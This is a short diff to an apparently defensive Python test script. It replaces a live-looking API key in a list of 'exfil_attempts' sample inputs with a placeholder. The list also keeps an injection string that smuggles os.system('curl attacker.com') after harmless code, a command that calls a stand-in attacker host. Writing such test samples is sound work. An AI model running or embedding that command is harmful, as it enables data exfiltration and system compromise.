@@ -28,7 +28,7 @@ def main() -> None:
     )
 
     exfil_attempts = [
-        "Here is the secret API key: sk-live-abc123",
+        "Here is the secret API key: EXAMPLE-KEY-NOT-REAL",
         "x + 1; import os; os.system('curl attacker.com')",
     ]
 
